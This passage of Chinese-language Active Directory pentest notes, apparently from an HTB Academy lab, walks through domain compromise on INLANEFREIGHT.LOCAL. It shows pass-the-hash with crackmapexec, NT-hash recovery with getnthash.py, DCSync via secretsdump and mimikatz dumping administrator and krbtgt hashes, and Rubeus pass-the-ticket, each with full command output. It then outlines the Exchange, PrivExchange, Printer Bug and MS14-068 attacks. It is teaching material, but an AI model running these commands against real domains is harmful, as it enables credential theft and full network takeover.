class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:dc01.ccache</span><br><span class="line">Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL</span><br></pre></td></tr></table></figure><p>最后，可以使用内置管理员帐户的 NT hash 来向域控制器进行身份验证。从这里开始，可以完全控制域，并可以尝试建立持久性、搜索敏感数据、查找报告的其他错误配置和漏洞，或者开始枚举信任关系。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)</span><br></pre></td></tr></table></figure><h4 id="PKINITtools-getnthash-py"><a href="#PKINITtools-getnthash-py" class="headerlink" title="PKINITtools getnthash.py"></a>PKINITtools getnthash.py</h4><p>还可以采取另一种方法。使用 PKINITtools 的工具<code>getnthash.py</code>，可以使用 Kerberos U2U 提交 TGS 请求，其中包含目标的 NT hash 的<a href="https://stealthbits.com/blog/what-is-the-kerberos-pac/">特权属性证书 (PAC)，</a>从而请求目标主机&#x2F;用户的NT Hash。这可以使用之前请求 TGT 时获得的 AS-REP 加密密钥进行解密。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> python /opt/PKINITtools/getnthash.py <span class="literal">-key</span> <span class="number">70</span>f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY<span class="literal">-EA-DC01</span><span class="variable">$</span></span><br><span class="line"></span><br><span class="line">Impacket v0.<span class="number">9.24</span>.dev1+<span class="number">20211013.152215</span>.<span class="number">3</span>fe2d73a - Copyright <span class="number">2021</span> SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> TGT from cache</span><br><span class="line">[*] Requesting ticket to self with PAC</span><br><span class="line">Recovered NT Hash</span><br><span class="line"><span class="number">313</span>b6f423cd1ee07e91315b4919fb4ba</span><br></pre></td></tr></table></figure><h3 id="DCSync-1"><a href="#DCSync-1" class="headerlink" title="DCSync"></a>DCSync</h3><h4 id="NTLM-hash-for-DCSync"><a href="#NTLM-hash-for-DCSync" class="headerlink" title="NTLM hash for DCSync"></a>NTLM hash for DCSync</h4><p>使用此哈希通过 <code>-hashes</code>参数与 secretsdump.py 执行 DCSync。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> secretsdump.py <span class="literal">-just-dc-user</span> INLANEFREIGHT/administrator <span class="string">&quot;ACADEMY-EA-DC01<span class="variable">$</span>&quot;</span>@<span class="number">172.16</span>.<span class="number">5.5</span> <span class="literal">-hashes</span> aad3c435b514a4eeaad3b935b51304fe:<span class="number">313</span>b6f423cd1ee07e91315b4919fb4ba</span><br><span class="line"></span><br><span class="line">Impacket v0.<span class="number">9.24</span>.dev1+<span class="number">20211013.152215</span>.<span class="number">3</span>fe2d73a - Copyright <span class="number">2021</span> SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] <span class="keyword">Using</span> the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">88</span>ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256<span class="literal">-cts-hmac-sha1-96</span>:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128<span class="literal">-cts-hmac-sha1-96</span>:<span class="number">95</span>c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des<span class="literal">-cbc-md5</span>:<span class="number">70</span>add6e02f70321f</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><p>或者，一旦通过 ntlmrelayx.py 获得 base64 证书，就可以在 Windows 攻击主机上使用该证书和 Rubeus 工具来请求 TGT 票证并一次性执行传递票证 (PTT) 攻击。</p><p>注意：需要<code>MS01</code>在另一个部分中使用攻击主机，例如<code>ACL Abuse Tactics</code>或<code>Privileged Access</code>部分，一旦将 base64 证书保存到笔记中，就可以使用 Rubeus 执行此操作。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; .\Rubeus.exe asktgt /user:ACADEMY<span class="literal">-EA-DC01</span><span class="variable">$</span> /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> PKINIT with e<span class="keyword">type</span> rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ PKINIT preauth) <span class="keyword">for</span>: <span class="string">&#x27;INLANEFREIGHT.LOCAL\ACADEMY-EA-DC01$&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: 172.16.5.5:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"> doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBURhggVAMIIFPKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D</span><br><span class="line">      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTyMIIE7qADAgEXoQMC</span><br><span class="line">      AQKiggTgBIIE3IHVcI8Q7gEgvqZmbo2BFOclIQogbXr++rtdBdgL5MPlU2V15kXxx4vZaBRzBv6/e3MC</span><br><span class="line">      exXtfUDZce8olUa1oy901BOhQNRuW0d9efigvnpL1fz0QwgLC0gcGtfPtQxJLTpLYWcDyViNdncjj76P</span><br><span class="line">      IZJzOTbSXT1bNVFpM9YwXa/tYPbAFRAhr0aP49FkEUeRVoz2HDMre8gfN5y2abc5039Yf9zjvo78I/HH</span><br><span class="line">      NmLWni29T9TDyfmU/xh/qkldGiaBrqOiUqC19X7unyEbafC6vr9er+j77TlMV88S3fUD/f1hPYMTCame</span><br><span class="line">      svFXFNt5VMbRo3/wQ8+fbPNDsTF+NZRLTAGZOsEyTfNEfpw1nhOVnLKrPYyNwXpddOpoD58+DCU90FAZ</span><br><span class="line">      g69yH2enKv+dNT84oQUxE+<span class="number">9</span>gOFwKujYxDSB7g/<span class="number">2</span>PUsfUh7hKhv3OkjEFOrzW3Xrh98yHrg6AtrENxL89</span><br><span class="line">      CxOdSfj0HNrhVFgMpMepPxT5Sy2mX8WDsE1CWjckcqFUS6HCFwAxzTqILbO1mbNO9gWKhMPwyJDlENJq</span><br><span class="line">      WdmLFmThiih7lClG05xNt56q2EY3y/m8Tpq8nyPey580TinHrkvCuE2hLeoiWdgBQiMPBUe23NRNxPHE</span><br><span class="line">      PjrmxMU/HKr/BPnMobdfRafgYPCRObJVQynOJrummdx5scUWTevrCFZd+q3EQcnEyRXcvQJFDU3VVOHb</span><br><span class="line">      Cfp+IYd5AXGyIxSmena/+uynzuqARUeRl1x/q8jhRh7ibIWnJV8YzV84zlSc4mdX4uVNNidLkxwCu2Y4</span><br><span class="line">      K37BE6AWycYH7DjZEzCE4RSeRu5fy37M0u6Qvx7Y7S04huqy1Hbg0RFbIw48TRN6qJrKRUSKep1j19n6</span><br><span class="line">      h3hw9z4LN3iGXC4Xr6AZzjHzY5GQFaviZQ34FEg4xF/Dkq4R3abDj+RWgFkgIl0B5y4oQxVRPHoQ+<span class="number">60</span>n</span><br><span class="line">      CXFC5KznsKgSBV8Tm35l6RoFN5Qa6VLvb+P5WPBuo7F0kqUzbPdzTLPCfx8MXt46Jbg305QcISC/QOFP</span><br><span class="line">      T//e7l7AJbQ+GjQBaqY8qQXFD1Gl4tmiUkVMjIQrsYQzuL6D3Ffko/OOgtGuYZu8yO9wVwTQWAgbqEbw</span><br><span class="line">      T2xd+SRCmElUHUQV0eId1lALJfE1DC/<span class="number">5</span>w0++<span class="number">2</span>srQTtLA4LHxb3L5dalF/fCDXjccoPj0+Q+vJmty0XGe</span><br><span class="line">      +Dz6GyGsW8eiE7RRmLi+IPzL2UnOa4CO5xMAcGQWeoHT0hYmLdRcK9udkO6jmWi4OMmvKzO0QY6xuflN</span><br><span class="line">      hLftjIYfDxWzqFoM4d3E1x/Jz4aTFKf4fbE3PFyMWQq98lBt3hZPbiDb1qchvYLNHyRxH3VHUQOaCIgL</span><br><span class="line">      /vpppveSHvzkfq/<span class="number">3</span>ft1gca6rCYx9Lzm8LjVosLXXbhXKttsKslmWZWf6kJ3Ym14nJYuq7OClcQzZKkb3</span><br><span class="line">      EPovED0+mPyyhtE8SL0rnCxy1XEttnusQfasac4Xxt5XrERMQLvEDfy0mrOQDICTFH9gpFrzU7d2v87U</span><br><span class="line">      HDnpr2gGLfZSDnh149ZVXxqe9sYMUqSbns6+UOv6EW3JPNwIsm7PLSyCDyeRgJxZYUl4XrdpPHcaX71k</span><br><span class="line">      ybUAsMd3PhvSy9HAnJ/tAew3+t/CsvzddqHwgYBohK+eg0LhMZtbOWv7aWvsxEgplCgFXS18o4HzMIHw</span><br><span class="line">      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARehEgQQd/AohN1w1ZZXsks8cCUlbqEVGxNJ</span><br><span class="line">      TkxBTkVGUkVJR0hULkxPQ0FMoh0wG6ADAgEBoRQwEhsQQUNBREVNWS1FQS1EQzAxJKMHAwUAQOEAAKUR</span><br><span class="line">      GA8yMDIyMDMzMDIyNTAyNVqmERgPMjAyMjAzMzEwODUwMjVapxEYDzIwMjIwNDA2MjI1MDI1WqgVGxNJ</span><br><span class="line">      TkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL</span><br><span class="line">  ServiceRealm             :  INLANEFREIGHT.LOCAL</span><br><span class="line">  UserName                 :  ACADEMY<span class="literal">-EA-DC01</span><span class="variable">$</span></span><br><span class="line">  UserRealm                :  INLANEFREIGHT.LOCAL</span><br><span class="line">  StartTime                :  <span class="number">3</span>/<span class="number">30</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">50</span>:<span class="number">25</span> PM</span><br><span class="line">  EndTime                  :  <span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">50</span>:<span class="number">25</span> AM</span><br><span class="line">  RenewTill                :  <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">50</span>:<span class="number">25</span> PM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  rc4_hmac</span><br><span class="line">  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==</span><br><span class="line">  ASREP (key)              :  <span class="number">2</span>A621F62C32241F38FA68826E95521DD</span><br></pre></td></tr></table></figure><p>然后可以输入内容<code>klist</code>来确认该票已在内存中。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>x4e56b</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">        Server: krbtgt/INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Ticket Flags <span class="number">0</span>x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize</span><br><span class="line">        <span class="built_in">Start</span> Time: <span class="number">3</span>/<span class="number">30</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">53</span>:<span class="number">09</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Renew Time: <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Cache Flags: <span class="number">0</span>x2 -&gt; DELEGATION</span><br><span class="line">        Kdc Called: ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line"><span class="comment">#1&gt;     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">        Server: krbtgt/INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Ticket Flags <span class="number">0</span>x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize</span><br><span class="line">        <span class="built_in">Start</span> Time: <span class="number">3</span>/<span class="number">30</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Renew Time: <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Cache Flags: <span class="number">0</span>x1 -&gt; PRIMARY</span><br><span class="line">        Kdc Called:</span><br><span class="line"></span><br><span class="line"><span class="comment">#2&gt;     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">        Server: cifs/academy<span class="literal">-ea-dc01</span> <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Ticket Flags <span class="number">0</span>x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize</span><br><span class="line">        <span class="built_in">Start</span> Time: <span class="number">3</span>/<span class="number">30</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">53</span>:<span class="number">09</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Renew Time: <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Cache Flags: <span class="number">0</span></span><br><span class="line">        Kdc Called: ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br></pre></td></tr></table></figure><h4 id="Mimikatz-performs-DCSync"><a href="#Mimikatz-performs-DCSync" class="headerlink" title="Mimikatz performs DCSync"></a>Mimikatz performs DCSync</h4><p>同样，由于域控制器在域中具有复制权限，可以使用传递票证从 Windows 攻击主机使用 Mimikatz 执行 DCSync 攻击。在这里，获取 KRBTGT 帐户的 NT hash，该哈希可用于创建黄金票证并建立持久性。可以使用 DCSync 获取任何特权用户的 NT hash，然后进入评估的下一阶段。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">cd</span> .\mimikatz\x64\</span><br><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:inlanefreight\krbtgt</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;inlanefreight\krbtgt&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">10</span>/<span class="number">27</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">14</span>:<span class="number">34</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-502</span></span><br><span class="line">Object Relative ID   : <span class="number">502</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">16</span>e26ba33e455a8c338142af8d89ffbc</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">16</span>e26ba33e455a8c338142af8d89ffbc</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">4562458</span>c201a97fa19365ce901513c21</span><br></pre></td></tr></table></figure><hr><h1 id="Miscellaneous-Misconfigurations"><a href="#Miscellaneous-Misconfigurations" class="headerlink" title="Miscellaneous Misconfigurations"></a>Miscellaneous Misconfigurations</h1><p>在评估过程中，可能会遇到许多其他攻击和有趣的错误配置。对 AD 的来龙去脉有广泛的了解将有助于跳出固有的思维模式，发现其他人可能忽略的问题。</p><h2 id="Exchange-Related-Group-Membership"><a href="#Exchange-Related-Group-Membership" class="headerlink" title="Exchange Related Group Membership"></a>Exchange Related Group Membership</h2><p>在 AD 环境中默认安装 Microsoft Exchange（没有拆分管理模型）会打开许多攻击途径，因为 Exchange 通常会在域内被授予相当大的权限（通过用户、组和 ACL）。该组<code>Exchange Windows Permissions</code>未列为受保护组，但成员被授予将 DACL 写入域对象的权限。可以利用这一点为用户提供 DCSync 权限。攻击者可以利用 DACL 配置错误（可能）或利用属于 Account Operators 组的受感染帐户将帐户添加到此组。通常会发现用户帐户甚至计算机是此组的成员。远程办公室的高级用户和支持人员通常会被添加到此组，从而允许他们重置密码。此<a href="https://github.com/gdedrouas/Exchange-AD-Privesc">GitHub 存储库</a>详细介绍了利用 Exchange 在 AD 环境中提升权限的几种技术。</p><p>Exchange 组<code>Organization Management</code>是另一个非常强大的组（实际上是 Exchange 的“域管理员”），可以访问所有域用户的邮箱。系统管理员成为此组的成员并不罕见。此组还对名为<code>Microsoft Exchange Security Groups</code>的 OU 具有完全控制权，其中包含组<code>Exchange Windows Permissions</code>。</p><p>查看管理员权限</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729062754599.png" alt="图像"></p><p>如果可以入侵 Exchange 服务器，这通常会导致域管理员权限。此外，从 Exchange 服务器转储内存中的凭据将产生 10 个甚至 100 个明文凭据或 NTLM 哈希。这通常是由于用户登录 Outlook Web Access (OWA) 并且 Exchange 在成功登录后将其凭据缓存在内存中。</p><h2 id="PrivExchange"><a href="#PrivExchange" class="headerlink" title="PrivExchange"></a>PrivExchange</h2><p>此次<code>PrivExchange</code>攻击源于 Exchange Server<code>PushSubscription</code>功能中的一个缺陷，该缺陷允许任何拥有邮箱的域用户强制 Exchange 服务器通过 HTTP 向客户端提供的任何主机进行身份验证。</p><p>Exchange 服务以 SYSTEM 身份运行，默认情况下具有过高权限（即，在 2019 年累积更新之前的域上具有 WriteDacl 权限）。可以利用此漏洞中继到 LDAP 并转储域 NTDS 数据库。如果无法中继到 LDAP，则可以利用此漏洞中继并验证域内的其他主机。此攻击将直接带您使用任何经过身份验证的域用户帐户进入域管理员。</p><h2 id="Printer-Bug"><a href="#Printer-Bug" class="headerlink" title="Printer Bug"></a>Printer Bug</h2><p>打印机漏洞是 MS-RPRN 协议（打印系统远程协议）中的一个漏洞。该协议定义了客户端和打印服务器之间打印作业处理和打印系统管理的通信。要利用此漏洞，任何域用户都可以使用该<code>RpcOpenPrinter</code>方法连接到 spool 的命名管道并使用该<code>RpcRemoteFindFirstPrinterChangeNotificationEx</code>方法，并强制服务器通过 SMB 向客户端提供的任何主机进行身份验证。</p><p>后台处理程序服务以 SYSTEM 身份运行，并默认安装在运行桌面体验的 Windows 服务器中。此攻击可利用来中继到 LDAP 并授予攻击者帐户 DCSync 权限，以从 AD 中检索所有密码哈希。</p><p>该攻击还可用于中继 LDAP 身份验证，并将受害者的基于资源的约束委派 (RBCD) 权限授予控制下的计算机帐户，从而使攻击者有权以受害者计算机上的任何用户身份进行身份验证。可以利用此攻击来破坏合作伙伴域&#x2F;林中的域控制器，前提是您已经拥有对第一个林&#x2F;域中的域控制器的管理访问权限，并且信任允许 TGT 委派（默认情况下不再如此）。</p><p>可以使用<a href="http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment">Security-Assessment</a>工具中的<code>Get-SpoolStatus</code>模块（可在生成的目标上找到）或<a href="https://github.com/NotMedic/NetNTLMtoSilverTicket">NetNTLMtoSilverTicket</a>工具等工具来检查易受<a href="https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability">MS-PRN 打印机漏洞攻击</a>的机器。此漏洞可用于破坏启用了无约束委派的另一个林中的主机，例如域控制器。一旦破坏了一个林，它就可以帮助跨林信任进行攻击。</p><h3 id="enum-8"><a href="#enum-8" class="headerlink" title="enum"></a>enum</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\SecurityAssessment.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-SpoolStatus</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">ComputerName                        Status</span><br><span class="line"><span class="literal">------------</span>                        <span class="literal">------</span></span><br><span class="line">ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL   True</span><br></pre></td></tr></table></figure><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>这是 Kerberos 协议中的一个缺陷，该缺陷可与标准域用户凭据一起利用，将权限提升至域管理员。Kerberos 票证包含有关用户的信息，包括特权属性证书 (PAC) 中的帐户名称、ID 和组成员身份。PAC 由 KDC 使用密钥签名，以验证 PAC 在创建后未被篡改。</p><p>该漏洞允许伪造的 PAC 被 KDC 视为合法。可以利用此漏洞创建假 PAC，将用户显示为域管理员或其他特权组的成员。可以使用<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek">Python Kerberos Exploitation Kit (PyKEK)</a>或 Impacket 工具包等工具来利用该漏洞。针对此攻击的唯一防御措施是修补。Hack The Box 平台上的机器<a href="https://app.hackthebox.com/machines/98">Mantis</a>展示了此漏洞。</p><h2 id="Sniffing-LDAP-Credentials"><a href="#Sniffing-LDAP-Credentials" class="headerlink" title="Sniffing LDAP Credentials"></a>Sniffing LDAP Credentials</h2><p>许多应用程序和打印机将 LDAP 凭据存储在其 Web 